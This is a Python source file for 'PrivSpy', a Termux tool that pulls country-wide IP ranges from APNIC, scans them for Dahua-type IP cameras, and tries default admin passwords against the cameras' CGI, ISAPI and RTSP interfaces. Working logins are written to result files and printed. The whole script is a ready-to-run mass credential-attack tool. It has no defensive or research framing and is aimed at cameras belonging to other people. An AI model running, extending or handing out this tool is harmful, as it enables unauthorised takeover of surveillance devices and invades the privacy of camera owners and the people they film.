#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PrivSpy v1.0 - Ultimate Dahua/Anjhua Camera Scanner
Detection + Brute Force + Verification
Termux Optimized - No False Positives
Update by Blade X DarkRoot
"""

import socket
import base64
import time
import sys
import ipaddress
import os
import math
import threading
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests.auth import HTTPDigestAuth
import urllib3
from datetime import datetime
import signal
import gc

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== COLORAMA SETUP ==========
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False
    class Fore:
        GREEN = '\033[92m'; RED = '\033[91m'; YELLOW = '\033[93m'
        CYAN = '\033[96m'; WHITE = '\033[97m'; MAGENTA = '\033[95m'
        BLUE = '\033[94m'
    class Style:
        RESET_ALL = '\033[0m'

# ========== রঙের তালিকা (ব্লেন্ডের জন্য) ==========
COLORS = [
    Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE,
    Fore.MAGENTA, Fore.CYAN, Fore.WHITE
]

# ========== এলোমেলো ব্লেন্ডেড ব্যানার ==========
def random_color():
    return random.choice(COLORS)

banner_lines = [
    "╔═══════════════════════════════════════════════════════════╗",
    "║  ██████╗ ██████╗ ██╗██╗   ██╗███████╗██████╗ ██╗   ██╗      ║",
    "║  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔══██╗╚██╗ ██╔╝      ║",
    "║  ██████╔╝██████╔╝██║██║   ██║███████╗██████╔╝ ╚████╔╝       ║",
    "║  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝╚════██║██╔═══╝   ╚██╔╝        ║",
    "║  ██║     ██║  ██║██║ ╚████╔╝ ███████║██║        ██║         ║",
    "║  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚═╝        ╚═╝         ║",
    "║                                                               ║",
    "║        PrivSpy v1.0 - Camera Intelligence Tool                ║",
    "║          Update by Blade X DarkRoot                         ║",
    "╚═══════════════════════════════════════════════════════════╝"
]

BANNER = ""
for line in banner_lines:
    BANNER += random_color() + line + Style.RESET_ALL + "\n"

# ========== বাকি কোড ==========
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
APNIC_URL = "https://ftp.apnic.net/stats/apnic/delegated-apnic-latest"

# ========== UPDATED CREDENTIALS (only 4) ==========
DEFAULT_CREDENTIALS = [
    ("admin", "admin123"),
    ("admin", "admin1234"),
    ("admin", "admin12345"),
    ("admin", "admin1122"),
]

# ========== COUNTRIES (44) ==========
COUNTRIES = {
    '1': {'name': 'Afghanistan', 'code': 'AF', 'file': 'AF_IP.txt'},
    '2': {'name': 'Australia', 'code': 'AU', 'file': 'AU_IP.txt'},
    '3': {'name': 'Bangladesh', 'code': 'BD', 'file': 'BD_IP.txt'},
    '4': {'name': 'Brunei', 'code': 'BN', 'file': 'BN_IP.txt'},
    '5': {'name': 'Bhutan', 'code': 'BT', 'file': 'BT_IP.txt'},
    '6': {'name': 'China', 'code': 'CN', 'file': 'CN_IP.txt'},
    '7': {'name': 'Cook Islands', 'code': 'CK', 'file': 'CK_IP.txt'},
    '8': {'name': 'Fiji', 'code': 'FJ', 'file': 'FJ_IP.txt'},
    '9': {'name': 'Micronesia', 'code': 'FM', 'file': 'FM_IP.txt'},
    '10': {'name': 'Guam', 'code': 'GU', 'file': 'GU_IP.txt'},
    '11': {'name': 'Hong Kong', 'code': 'HK', 'file': 'HK_IP.txt'},
    '12': {'name': 'Indonesia', 'code': 'ID', 'file': 'ID_IP.txt'},
    '13': {'name': 'India', 'code': 'IN', 'file': 'IN_IP.txt'},
    '14': {'name': 'Japan', 'code': 'JP', 'file': 'JP_IP.txt'},
    '15': {'name': 'Cambodia', 'code': 'KH', 'file': 'KH_IP.txt'},
    '16': {'name': 'Kiribati', 'code': 'KI', 'file': 'KI_IP.txt'},
    '17': {'name': 'South Korea', 'code': 'KR', 'file': 'KR_IP.txt'},
    '18': {'name': 'Sri Lanka', 'code': 'LK', 'file': 'LK_IP.txt'},
    '19': {'name': 'Laos', 'code': 'LA', 'file': 'LA_IP.txt'},
    '20': {'name': 'Myanmar', 'code': 'MM', 'file': 'MM_IP.txt'},
    '21': {'name': 'Mongolia', 'code': 'MN', 'file': 'MN_IP.txt'},
    '22': {'name': 'Macau', 'code': 'MO', 'file': 'MO_IP.txt'},
    '23': {'name': 'Maldives', 'code': 'MV', 'file': 'MV_IP.txt'},
    '24': {'name': 'Malaysia', 'code': 'MY', 'file': 'MY_IP.txt'},
    '25': {'name': 'New Caledonia', 'code': 'NC', 'file': 'NC_IP.txt'},
    '26': {'name': 'Nepal', 'code': 'NP', 'file': 'NP_IP.txt'},
    '27': {'name': 'Nauru', 'code': 'NR', 'file': 'NR_IP.txt'},
    '28': {'name': 'New Zealand', 'code': 'NZ', 'file': 'NZ_IP.txt'},
    '29': {'name': 'French Polynesia', 'code': 'PF', 'file': 'PF_IP.txt'},
    '30': {'name': 'Papua New Guinea', 'code': 'PG', 'file': 'PG_IP.txt'},
    '31': {'name': 'Philippines', 'code': 'PH', 'file': 'PH_IP.txt'},
    '32': {'name': 'Pakistan', 'code': 'PK', 'file': 'PK_IP.txt'},
    '33': {'name': 'North Korea', 'code': 'KP', 'file': 'KP_IP.txt'},
    '34': {'name': 'Palau', 'code': 'PW', 'file': 'PW_IP.txt'},
    '35': {'name': 'Solomon Islands', 'code': 'SB', 'file': 'SB_IP.txt'},
    '36': {'name': 'Singapore', 'code': 'SG', 'file': 'SG_IP.txt'},
    '37': {'name': 'Thailand', 'code': 'TH', 'file': 'TH_IP.txt'},
    '38': {'name': 'Timor-Leste', 'code': 'TL', 'file': 'TL_IP.txt'},
    '39': {'name': 'Tonga', 'code': 'TO', 'file': 'TO_IP.txt'},
    '40': {'name': 'Taiwan', 'code': 'TW', 'file': 'TW_IP.txt'},
    '41': {'name': 'Vanuatu', 'code': 'VU', 'file': 'VU_IP.txt'},
    '42': {'name': 'Vietnam', 'code': 'VN', 'file': 'VN_IP.txt'},
    '43': {'name': 'Samoa', 'code': 'WS', 'file': 'WS_IP.txt'},
    '44': {'name': 'United States (APNIC)', 'code': 'US', 'file': 'US_IP.txt'},
}

results_lock = threading.Lock()
valid_results = []
scanned_count = 0
total_ips = 0
start_time = time.time()
cctv_output_file = None
stop_flag = False

def signal_handler(sig, frame):
    global stop_flag
    print(f"\n{Fore.YELLOW}[!] Interrupt received, exiting gracefully...{Style.RESET_ALL}")
    stop_flag = True
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ========== IP GENERATORS ==========
def ip_range_generator(start_ip, end_ip):
    try:
        start = int(ipaddress.IPv4Address(start_ip))
        end = int(ipaddress.IPv4Address(end_ip))
        if start > end:
            start, end = end, start
        for ip_int in range(start, end + 1):
            yield str(ipaddress.IPv4Address(ip_int))
    except:
        return

def cidr_to_ip_generator(cidr_notation):
    try:
        ip_str, count_str = cidr_notation.split('/')
        count = int(count_str)
        if count <= 0:
            return
        prefix_len = 32 - int(math.log2(count))
        network = ipaddress.IPv4Network(f"{ip_str}/{prefix_len}", strict=False)
        for ip in network.hosts():
            yield str(ip)
    except:
        return

# ========== PORT SCAN ==========
def port_scan_single(ip, port, timeout=0.8):
    if stop_flag:
        return None
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        if sock.connect_ex((ip, port)) == 0:
            return port
    except:
        pass
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass
    return None

def fast_port_scan(ip, ports, timeout=0.8):
    open_ports = []
    with ThreadPoolExecutor(max_workers=len(ports)) as executor:
        futures = {executor.submit(port_scan_single, ip, p, timeout): p for p in ports}
        for future in as_completed(futures):
            if stop_flag:
                break
            res = future.result()
            if res:
                open_ports.append(res)
                if res in [80, 443, 554, 37777, 8080]:
                    break
    return open_ports

# ========== ENHANCED DETECTION ==========
def detect_camera_via_http(ip, port=80):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(0.8)
            sock.connect((ip, port))
            sock.send(b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n')
            response = sock.recv(4096).decode(errors='ignore').lower()
            if 'web service' in response or 'dahua' in response or 'anjhua' in response:
                return True, "Anjhua-Dahua Technology Camera"
            if 'login' in response and ('camera' in response or 'ip camera' in response or '/cgi-bin/' in response):
                return True, "Anjhua-Dahua Technology Camera"
            return False, ""
    except:
        return False, ""

def detect_camera_port_based(ip, port):
    if port in [37777, 554]:
        return True, "Anjhua-Dahua Technology Camera"
    if port in [80, 8080, 443]:
        return detect_camera_via_http(ip, port)
    return False, ""

# ========== TWO-STEP VALIDATOR ==========
class DahuaCameraValidator:
    def __init__(self, ip, username, password, port=80):
        self.ip = ip
        self.username = username
        self.password = password
        self.port = port
        self.timeout = 1.2

    def validate(self):
        success, msg = self._validate_magicbox()
        if success:
            return True, "Auth success (magicBox)"
        if msg == "Invalid credentials":
            return False, msg
        success, msg = self._validate_configmanager()
        if success:
            return True, "Auth success (configManager)"
        if msg == "Invalid credentials":
            return False, msg
        if self.port == 554:
            return self._validate_rtsp()
        success, msg = self._validate_isapi()
        if success:
            return True, "Auth success (ISAPI)"
        return False, "All methods failed"

    def _validate_magicbox(self):
        endpoint = "/cgi-bin/magicBox.cgi?action=getDeviceType"
        try:
            url = f"http://{self.ip}:{self.port}{endpoint}"
            response = requests.get(
                url,
                auth=HTTPDigestAuth(self.username, self.password),
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            if response.status_code == 200:
                return True, "Success"
            elif response.status_code == 401:
                return False, "Invalid credentials"
            else:
                return False, "Not available"
        except requests.exceptions.Timeout:
            return False, "Timeout"
        except requests.exceptions.ConnectionError:
            return False, "Connection error"
        except Exception:
            return False, "Error"

    def _validate_configmanager(self):
        endpoint = "/cgi-bin/configManager.cgi?action=getConfig&name=system"
        try:
            url = f"http://{self.ip}:{self.port}{endpoint}"
            response = requests.get(
                url,
                auth=HTTPDigestAuth(self.username, self.password),
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            if response.status_code == 200:
                return True, "Success"
            elif response.status_code == 401:
                return False, "Invalid credentials"
            else:
                return False, "Not available"
        except:
            return False, "Error"

    def _validate_isapi(self):
        endpoint = "/ISAPI/System/deviceInfo"
        try:
            url = f"http://{self.ip}:{self.port}{endpoint}"
            response = requests.get(
                url,
                auth=HTTPDigestAuth(self.username, self.password),
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            if response.status_code == 200:
                return True, "Success"
            elif response.status_code == 401:
                return False, "Invalid credentials"
            else:
                return False, "Not available"
        except:
            return False, "Error"

    def _validate_rtsp(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.ip, 554))
            rtsp_url = f"rtsp://{self.ip}:554/cam/realmonitor?channel=1&subtype=0"
            request = f"DESCRIBE {rtsp_url} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {base64.b64encode(f'{self.username}:{self.password}'.encode()).decode()}\r\n\r\n"
            sock.send(request.encode())
            response = sock.recv(1024).decode(errors='ignore')
            sock.close()
            if "200 OK" in response:
                return True, "RTSP success"
            else:
                return False, "RTSP failed"
        except:
            return False, "RTSP error"

# ========== SINGLE IP SCAN ==========
def scan_single_ip(ip, credentials, ports):
    global scanned_count, total_ips, cctv_output_file, stop_flag
    if stop_flag:
        return None

    with results_lock:
        scanned_count += 1
        cur = scanned_count
    if cur % 20 == 0 or cur == total_ips:
        print(f"{Fore.CYAN}[*] {cur}/{total_ips} IPs scanned, found {len(valid_results)} cameras{Style.RESET_ALL}", end='\r', flush=True)

    open_ports = fast_port_scan(ip, ports, timeout=0.8)
    if not open_ports:
        return None

    camera_ports = []
    for port in open_ports:
        found, _ = detect_camera_port_based(ip, port)
        if found:
            camera_ports.append(port)

    if not camera_ports:
        return None

    for port in camera_ports:
        _, cam_type = detect_camera_port_based(ip, port)
        if not cam_type:
            cam_type = "Anjhua-Dahua Technology Camera"

        for username, password in credentials:
            validator = DahuaCameraValidator(ip, username, password, port)
            success, msg = validator.validate()
            if success:
                if verify_camera_access(ip, username, password, port):
                    return _record_result(ip, username, password, cam_type, port, msg)
                else:
                    continue

    return None

def verify_camera_access(ip, username, password, port):
    try:
        url = f"http://{ip}:{port}/cgi-bin/magicBox.cgi?action=getDeviceType"
        response = requests.get(
            url,
            auth=HTTPDigestAuth(username, password),
            timeout=1.5,
            verify=False,
            allow_redirects=False
        )
        if response.status_code == 200:
            return True
        url = f"http://{ip}:{port}/cgi-bin/configManager.cgi?action=getConfig&name=system"
        response = requests.get(
            url,
            auth=HTTPDigestAuth(username, password),
            timeout=1.5,
            verify=False,
            allow_redirects=False
        )
        if response.status_code == 200:
            return True
        return False
    except:
        return False

def _record_result(ip, username, password, cam_type, port, msg):
    global valid_results, cctv_output_file
    result = {
        'ip': ip, 'username': username, 'password': password,
        'camera_type': cam_type, 'port': port, 'message': msg,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    with results_lock:
        valid_results.append(result)

    if cctv_output_file:
        try:
            with open(cctv_output_file, 'a', encoding='utf-8') as f:
                f.write(f"{'='*60}\n")
                f.write(f"Camera Type: {cam_type}\n")
                f.write(f"IP Address: {ip}\n")
                f.write(f"Port: {port}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Password: {password}\n")
                f.write(f"Status: {msg}\n")
                f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'='*60}\n\n")
                f.flush()
        except:
            pass

    print()
    print(f"{Fore.GREEN}[✓] CAMERA FOUND!{Style.RESET_ALL}")
    print(f"    IP: {Fore.CYAN}{ip}{Style.RESET_ALL}")
    print(f"    Type: {Fore.YELLOW}{cam_type}{Style.RESET_ALL}")
    print(f"    Login: {Fore.GREEN}{username}:{password}{Style.RESET_ALL}")
    print(f"    Port: {port}\n")
    return result

# ========== COUNTRY IP FETCHING ==========
def fetch_country_ipv4_from_apnic(country_code):
    ipv4_list = []
    try:
        response = requests.get(APNIC_URL, timeout=30)
        response.raise_for_status()
        for line in response.text.splitlines():
            if line.startswith('#'):
                continue
            parts = line.split('|')
            if len(parts) >= 7 and parts[1].upper() == country_code.upper() and parts[2].lower() == 'ipv4':
                start_ip = parts[3]
                count = int(parts[4])
                ipv4_list.append(f"{start_ip}/{count}")
        return ipv4_list
    except Exception as e:
        print(f"{Fore.RED}[!] Error fetching IPs: {e}{Style.RESET_ALL}")
        return []

def save_ip_ranges_to_file(ipv4_list, file_path):
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(ipv4_list))
        return True
    except:
        return False

def load_country_ip_ranges(country_file, country_code=None, auto_fetch=True):
    for path in [os.path.join(SCRIPT_DIR, country_file), country_file]:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
    if auto_fetch and country_code:
        print(f"{Fore.YELLOW}[!] File not found, fetching from APNIC...{Style.RESET_ALL}")
        ipv4_list = fetch_country_ipv4_from_apnic(country_code)
        if ipv4_list:
            save_ip_ranges_to_file(ipv4_list, os.path.join(SCRIPT_DIR, country_file))
            return ipv4_list
    return []

# ========== BATCH SCANNER ==========
def scan_country_detection_only(country, max_workers=None):
    global total_ips, scanned_count, valid_results, start_time, cctv_output_file, stop_flag
    stop_flag = False

    country_file = country['file']
    cctv_output_file = os.path.join(SCRIPT_DIR, f"{country['code']}_CCTV_Found.txt")
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Scanning: {country['name']} ({country['code']}){Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Output: {cctv_output_file}{Style.RESET_ALL}")

    ip_ranges = load_country_ip_ranges(country_file, country_code=country['code'], auto_fetch=True)
    if not ip_ranges:
        print(f"{Fore.RED}[!] No IP ranges found.{Style.RESET_ALL}")
        return

    print(f"{Fore.CYAN}[→] Counting total IPs...{Style.RESET_ALL}")
    total_ips = 0
    for cidr in ip_ranges:
        try:
            ip_str, count_str = cidr.split('/')
            count = int(count_str)
            total_ips += count
        except:
            continue
    print(f"{Fore.GREEN}[✓] Estimated IPs: {total_ips}{Style.RESET_ALL}")

    if max_workers is None:
        max_workers = min(os.cpu_count() * 2, 15)
    ports = [80, 8080, 443, 554, 37777]
    print(f"{Fore.CYAN}[*] Using {max_workers} threads, ports: {', '.join(map(str, ports))}{Style.RESET_ALL}\n")

    start_time = time.time()
    scanned_count = 0
    valid_results.clear()

    try:
        if os.path.exists(cctv_output_file):
            os.remove(cctv_output_file)
    except:
        pass

    batch_size = 3000
    ip_batch = []

    def process_batch(batch_ips):
        if not batch_ips:
            return
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(scan_single_ip, ip, DEFAULT_CREDENTIALS, ports): ip for ip in batch_ips}
            for future in as_completed(futures):
                if stop_flag:
                    break
                try:
                    future.result()
                except Exception:
                    pass
        gc.collect()

    print(f"{Fore.CYAN}[→] Scanning in batches of {batch_size} IPs...{Style.RESET_ALL}")
    for cidr in ip_ranges:
        if stop_flag:
            break
        for ip in cidr_to_ip_generator(cidr):
            if stop_flag:
                break
            ip_batch.append(ip)
            if len(ip_batch) >= batch_size:
                process_batch(ip_batch)
                ip_batch.clear()
        if ip_batch:
            process_batch(ip_batch)
            ip_batch.clear()

    elapsed = time.time() - start_time
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[✓] Scan Complete{Style.RESET_ALL}")
    print(f"Total IPs scanned: {scanned_count}")
    print(f"Time: {elapsed:.1f}s, Speed: {scanned_count/elapsed:.1f} IP/s" if elapsed > 0 else "Time: 0s")
    print(f"Valid credentials found: {Fore.GREEN}{len(valid_results)}{Style.RESET_ALL}")
    print(f"Results saved to: {Fore.YELLOW}{cctv_output_file}{Style.RESET_ALL}")

# ========== MENU FUNCTIONS ==========
def print_full_country_menu():
    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}🌍 Available Countries (Total: {len(COUNTRIES)}){Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    items = list(COUNTRIES.items())
    cols = 3
    rows = (len(items) + cols - 1) // cols
    for row in range(rows):
        line = ""
        for col in range(cols):
            idx = row + col * rows
            if idx < len(items):
                key, val = items[idx]
                line += f"  {Fore.YELLOW}{key:>2}.{Style.RESET_ALL} {val['name']:<22}"
        print(line)
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")

def view_valid_cameras():
    files = [f for f in os.listdir(SCRIPT_DIR) if f.endswith('ValidCamera.txt')]
    if not files:
        print(f"{Fore.RED}No results files found{Style.RESET_ALL}")
        return
    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Available ValidCamera Files:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    for i, f in enumerate(files, 1):
        print(f"  {i}. {f}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
    try:
        sel = int(input(f"{Fore.GREEN}Select file number: {Style.RESET_ALL}")) - 1
        if 0 <= sel < len(files):
            with open(os.path.join(SCRIPT_DIR, files[sel]), 'r', encoding='utf-8') as f:
                print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
                print(f.read())
                print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.RED}Invalid selection{Style.RESET_ALL}")
    except ValueError:
        print(f"{Fore.RED}Invalid input{Style.RESET_ALL}")

def brute_force_from_cctv_file():
    files = [f for f in os.listdir(SCRIPT_DIR) if f.endswith('_CCTV_Found.txt')]
    if not files:
        print(f"{Fore.RED}No CCTV files found{Style.RESET_ALL}")
        return
    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Available CCTV Found Files:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    for i, f in enumerate(files, 1):
        print(f"  {i}. {f}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
    try:
        sel = int(input(f"{Fore.GREEN}Select file number: {Style.RESET_ALL}")) - 1
        if 0 <= sel < len(files):
            file_path = os.path.join(SCRIPT_DIR, files[sel])
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            ips = []
            for line in content.splitlines():
                if 'IP Address:' in line:
                    ip = line.split(':')[1].strip()
                    ips.append(ip)
            if not ips:
                print(f"{Fore.RED}No IPs found in file{Style.RESET_ALL}")
                return
            print(f"{Fore.CYAN}[*] Brute forcing {len(ips)} IPs...{Style.RESET_ALL}")
            global cctv_output_file, total_ips, scanned_count, valid_results, stop_flag
            cctv_output_file = os.path.join(SCRIPT_DIR, "bruteforce_results.txt")
            total_ips = len(ips)
            scanned_count = 0
            valid_results.clear()
            stop_flag = False
            batch_size = 1000
            for i in range(0, len(ips), batch_size):
                batch = ips[i:i+batch_size]
                with ThreadPoolExecutor(max_workers=15) as executor:
                    futures = [executor.submit(scan_single_ip, ip, DEFAULT_CREDENTIALS, [80, 8080]) for ip in batch]
                    for f in as_completed(futures):
                        if stop_flag:
                            break
                        try:
                            f.result()
                        except:
                            pass
                gc.collect()
            print(f"{Fore.GREEN}[✓] Done. Found {len(valid_results)} valid credentials{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Invalid selection{Style.RESET_ALL}")
    except ValueError:
        print(f"{Fore.RED}Invalid input{Style.RESET_ALL}")

def quick_ip_range_scan():
    start = input(f"{Fore.GREEN}Start IP: {Style.RESET_ALL}").strip()
    end = input(f"{Fore.GREEN}End IP: {Style.RESET_ALL}").strip()
    if not start or not end:
        print(f"{Fore.RED}Both IPs required{Style.RESET_ALL}")
        return
    global cctv_output_file, total_ips, scanned_count, valid_results, stop_flag
    cctv_output_file = os.path.join(SCRIPT_DIR, "range_results.txt")
    try:
        total_ips = sum(1 for _ in ip_range_generator(start, end))
    except:
        total_ips = 0
    scanned_count = 0
    valid_results.clear()
    stop_flag = False
    print(f"{Fore.CYAN}[*] Scanning range...{Style.RESET_ALL}")
    batch_size = 2000
    batch = []
    for ip in ip_range_generator(start, end):
        batch.append(ip)
        if len(batch) >= batch_size:
            with ThreadPoolExecutor(max_workers=15) as executor:
                futures = [executor.submit(scan_single_ip, ip, DEFAULT_CREDENTIALS, [80, 8080]) for ip in batch]
                for f in as_completed(futures):
                    if stop_flag:
                        break
                    try:
                        f.result()
                    except:
                        pass
            batch.clear()
            gc.collect()
    if batch:
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = [executor.submit(scan_single_ip, ip, DEFAULT_CREDENTIALS, [80, 8080]) for ip in batch]
            for f in as_completed(futures):
                if stop_flag:
                    break
                try:
                    f.result()
                except:
                    pass
    print(f"{Fore.GREEN}[✓] Done. Found {len(valid_results)} cameras{Style.RESET_ALL}")

def main():
    print(BANNER)
    while True:
        print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Main Menu:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}1.{Style.RESET_ALL} Scan Country (Detection + Login)")
        print(f"{Fore.YELLOW}2.{Style.RESET_ALL} Quick Scan IP Range")
        print(f"{Fore.YELLOW}3.{Style.RESET_ALL} View Saved Results")
        print(f"{Fore.YELLOW}4.{Style.RESET_ALL} Brute Force from Saved CCTV File")
        print(f"{Fore.YELLOW}5.{Style.RESET_ALL} Exit")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")

        choice = input(f"{Fore.GREEN}Enter choice (1-5): {Style.RESET_ALL}").strip()

        if choice == '1':
            print_full_country_menu()
            cnum = input(f"{Fore.GREEN}Enter country number (1-{len(COUNTRIES)}): {Style.RESET_ALL}").strip()
            if cnum in COUNTRIES:
                scan_country_detection_only(COUNTRIES[cnum])
            else:
                print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
        elif choice == '2':
            quick_ip_range_scan()
        elif choice == '3':
            view_valid_cameras()
        elif choice == '4':
            brute_force_from_cctv_file()
        elif choice == '5':
            print(f"{Fore.GREEN}Exiting...{Style.RESET_ALL}")
            sys.exit(0)
        else:
            print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        sys.exit(1)